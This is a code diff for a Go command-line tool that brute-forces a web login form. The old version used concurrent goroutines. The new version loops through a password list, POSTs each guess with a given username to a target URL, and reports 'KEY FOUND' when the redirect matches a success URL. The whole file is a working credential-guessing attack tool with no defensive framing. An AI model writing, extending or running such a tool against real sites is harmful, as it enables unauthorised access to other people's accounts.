@@ -7,90 +7,70 @@ import (
 	"net/http"
 	"os"
 	"strings"
-	"sync"
 )
 
-func attemptLogin(targetURL, username, password, successRedirect string, wg *sync.WaitGroup, found *bool, foundPassword *string) {
-	defer wg.Done()
-
-	// If a password has already been found, skip further attempts
-	if *found {
-		return
-	}
-
-	client := &http.Client{}
-	req, err := http.NewRequest("POST", targetURL, strings.NewReader(fmt.Sprintf("username=%s&password=%s", username, password)))
-	if err != nil {
-		fmt.Printf("Error creating request for password '%s': %v\n", password, err)
-		return
-	}
-
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Printf("Error sending request for password '%s': %v\n", password, err)
-		return
-	}
-	defer resp.Body.Close()
-
-	// Check if the request was redirected to the success URL
-	if resp.Request.URL.String() == successRedirect {
-		fmt.Printf("KEY FOUND [%s]\n", password)
-		*found = true
-		*foundPassword = password
-	}
-}
-
 func main() {
-	// Define command-line flags
-	username := flag.String("l", "", "Username (required)")
-	passwordList := flag.String("P", "", "Password list file (required)")
-	redirectURL := flag.String("--redirect", "", "Success redirect URL (required)")
-	targetURL := flag.String("--url", "", "Target URL for brute-forcing (required)")
+	// Command-line arguments
+	username := flag.String("l", "", "Username to test")
+	passwordList := flag.String("P", "", "Path to password list")
+	url := flag.String("url", "", "Target URL")
+	successRedirect := flag.String("--redirect", "", "Success redirect URL")
 	flag.Parse()
 
-	// Validate mandatory flags
-	if *username == "" || *passwordList == "" || *targetURL == "" || *redirectURL == "" {
-		fmt.Println("Usage: mephisto.exe -l username -P passwordlist --url target_url --redirect success_url")
-		flag.PrintDefaults()
+	if *username == "" || *passwordList == "" || *url == "" || *successRedirect == "" {
+		fmt.Println("Usage: hydra2.go -l username -P passwordlist url --redirect success_redirect_url")
 		os.Exit(1)
 	}
 
-	// Open the password list file
+	// Open the password file
 	file, err := os.Open(*passwordList)
 	if err != nil {
-		fmt.Printf("Error opening password file: %v\n", err)
-		return
+		fmt.Printf("Error opening password list: %v\n", err)
+		os.Exit(1)
 	}
 	defer file.Close()
 
-	// Variables to track success
-	var found bool
-	var foundPassword string
-	var wg sync.WaitGroup
+	// Create an HTTP client
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // Prevent automatic redirects
+		},
+	}
 
-	// Scan through the password list
+	// Read passwords and attempt login
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		if found {
-			break // Stop if a valid password is already found
+		password := scanner.Text()
+
+		// Create a POST request
+		data := fmt.Sprintf("username=%s&password=%s", *username, password)
+		req, err := http.NewRequest("POST", *url, strings.NewReader(data))
+		if err != nil {
+			fmt.Printf("Error creating request: %v\n", err)
+			continue
 		}
 
-		password := scanner.Text()
-		wg.Add(1)
-		go attemptLogin(*targetURL, *username, password, *redirectURL, &wg, &found, &foundPassword)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+		// Send the request
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Printf("Error sending request: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		// Check for redirect to success URL
+		if resp.StatusCode == http.StatusFound && resp.Header.Get("Location") == *successRedirect {
+			fmt.Printf("KEY FOUND: %s\n", password)
+			return
+		}
 	}
 
-	wg.Wait() // Wait for all goroutines to complete
-
-	if scanner.Err() != nil {
-		fmt.Printf("Error reading password file: %v\n", scanner.Err())
+	if err := scanner.Err(); err != nil {
+		fmt.Printf("Error reading password list: %v\n", err)
+		os.Exit(1)
 	}
 
-	// Final result
-	if found {
-		fmt.Printf("Password successfully found: [%s]\n", foundPassword)
-	} else {
-		fmt.Println("KEY NOT FOUND")
-	}
+	fmt.Println("KEY NOT FOUND")
 }
